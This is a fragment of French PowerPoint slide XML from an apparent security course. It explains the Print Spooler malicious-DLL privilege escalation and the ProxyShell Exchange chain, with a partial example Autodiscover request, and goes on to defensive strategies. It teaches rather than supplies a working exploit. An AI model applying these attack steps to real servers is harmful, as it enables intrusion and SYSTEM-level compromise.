              <a:t>accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>limité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à la machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cible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Soumission</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>pilote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Exploite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le Print Spooler pour charger </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillante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Élévation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La DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>s'exécute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> SYSTEM.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754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FD4F2-6F96-F056-147F-D9EF7CD56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Pourquoi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>est-ce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faille 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EA7CD-9C0A-17D1-8ABD-02EB3584E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Absence de restrictions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>robustes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Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillants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non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>signés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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acceptés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Problème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> dans la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>vérification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>privilèges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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisateur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> standard </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> installer des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à distance.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Accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> SYSTEM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Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> chargés </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>s’exécutent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contexte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du processus Spooler, qui utilise SYSTEM.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2796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9268D-4481-23B8-CEBE-B4241BBF7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Exploitation via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillante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0A39-A336-C15A-E8C2-8E6395BD1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Fichier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>malveillant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Création</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contenant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraire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Utilisation de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>AddPrinterDriverEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>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Méthode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> RPC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permettant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de charger des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes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Charge utile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Code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans la DLL qui </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>s’exécute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> son </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chargement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19570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BEC77E-BF43-13F2-EAE1-D0C9DC35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Les dernières techniques d’attaques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9C2A40-E2F1-247F-3E03-58285718EA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016213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3692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E77A-CD9D-D031-E0CD-14C89598C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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> que </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ProxyShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 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75345-5F89-B20A-775C-4D83418F7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Regroupe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> trois </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans Microsoft Exchange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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>commandes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à distance (RCE).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Impact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err="1"/>
              <a:t>Accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>autorisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Compromission des données et des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes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CVE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>associées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/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CVE-2021-34473 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Authentification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>incorrecte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans le service Autodiscover.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CVE-2021-34523 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Élévation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans PowerShell backend.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CVE-2021-31207 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillants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9098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09F63-976C-EBDD-D2FC-2FCB6B2D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1"/>
            <a:ext cx="9144000" cy="869092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Principe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>général</a:t>
            </a:r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3FA622-778A-CC0F-7CA3-8BF509988F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5344924"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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4533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318CA-502C-9754-F836-16AA267B3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1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Authentification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>incorrecte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (CVE-2021-34473)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E1513-E609-B8D6-40EC-7F6BF5EF7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Exploitation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> faiblesse dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mécanisme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Autodiscover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Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>requêtes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> mal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>formées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non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>authentifiées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peuvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contourner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vérification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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>requête</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>POST /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>autodiscover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>autodiscover.json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> HTTP/1.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Host: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>target_server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>&gt;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11726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7EF5C-7BBF-7E5E-E285-AAC6C3A1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2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Élévation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (CVE-2021-34523)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D57D-82D1-A6BF-711E-1D09D75C8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Une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fois</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>connecté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attaquants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exploitent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faille dans la gestion des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>tokens </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’authentification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Ils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>élèvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>leurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>obtenir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>administrateur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Cela </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’accéder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctionnalités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> critiques du backend.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18521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A1E40-8BDD-E7B1-F7C6-E905CBD1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Phase 3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (CVE-2021-31207)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83F14-4068-33A4-B90A-17DB77952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Envoi de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via le service OWA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> ECP.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d’exploitation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Injection de scripts dans un message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commande</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> PowerShell.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Appel à des modules </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> backend.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Résultat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Commandes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécutées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sur le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>serveur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67329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CFD51B-4FA5-442F-8E23-2B8C32126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Impacts observés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ED1C4-01A0-A447-730E-2FC11986C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Effets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>potentiels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/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Compromission des données (e-mails, contacts).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err="1"/>
              <a:t>Déploiement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de ransomware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de malware.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err="1"/>
              <a:t>Défaillance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Exchange.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95903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E0AF3-E796-E55A-CCE0-04DC5F27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1"/>
            <a:ext cx="9144000" cy="869092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État </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>actuel</a:t>
            </a:r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32AC7B-AA25-7FD5-8DB3-DE19AC629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9524980"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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63325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5911B-1E2F-489E-97EF-A15A9299E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19D4F1-CE65-4D74-A168-F27C15F1B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of an electromagnetic radiation">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3A8738B-AAEA-0E84-7A82-998762B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20778" r="19668" b="2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="20" y="10"/>
            <a:ext cx="6095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37CB9F-74FF-FC79-7F37-20AC10072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025718"/>
            <a:ext cx="4057650" cy="4770783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rgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Les dernières stratégies défensives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845D690-7C92-A06E-66A5-366DBC649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9972" y="762000"/>
            <a:ext cx="3825025" cy="5334000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1"/>
              <a:t>Thème : Approches modernes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/>
              <a:t>Défense en profondeur :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Segmentation des réseaux.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Analyse comportementale avec l’IA.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/>
              <a:t>Hardening des systèmes :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Mise à jour continue.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Utilisation d’EDR (Endpoint Detection &amp; Response).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/>
              <a:t>Sandboxing :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Isolation des applications dans des environnements sécurisés.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone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7419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36434-4977-7E18-FD83-8AF2B3E53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Techniques défensives modernes : Exemple concret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632D7-20D7-C419-0353-B7B7A9A48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/>
          </a:bodyPr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Cas : Analyse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>comportementale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> avec IA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Description : Utilisation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’algorithmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des anomalies dans des flux réseau.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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DDoS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identifiée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temps </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportementale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Darktrace.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92419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8A4AEB-7C75-349C-0BD8-F4BBFA541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GB" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pourquoi étudier les vulnérabilités et techniques modernes ?</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="26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7C0268-A27B-839B-F703-CB3A0DF36F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6475782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31060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218290-08E7-4AB8-8549-F625B01F0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F5FC46-D882-F0CA-3F4E-60EE0CBA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7" y="762001"/>
            <a:ext cx="5333365" cy="114100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200"/>
              <a:t>Comprendre l’architecture logicielle</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="220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F910736-A676-5F58-DEAD-38F64DF3B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7" y="2259698"/>
            <a:ext cx="4991103" cy="3836301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GB" sz="1700" b="1"/>
              <a:t>Titre : Du C à l’assembleur et au langage machine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700" b="1"/>
              <a:t>Pourquoi est-ce important ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="170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700"/>
              <a:t>Comprendre comment le code s’exécute au niveau du processeur.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700"/>
              <a:t>Identifier les failles dans les programmes compilés.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700" b="1"/>
              <a:t>Compétences essentielles :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="170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700"/>
              <a:t>Langage C : structuration de base et vulnérabilités communes.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700"/>
              <a:t>Assembleur : interaction directe avec le matériel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR" sz="17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9A9457-874F-4EEB-BF07-9CEA561C1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9965" y="1114197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Tick">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{219569E1-5A19-DEA0-823F-F11A1B833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6075" y="1890308"/>
            <a:ext cx="3077384" cy="307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944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B28E3-EBFA-3374-C6B7-B007BE52C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1"/>
            <a:ext cx="9144000" cy="869092"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Pourquoi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>langage</a:t>
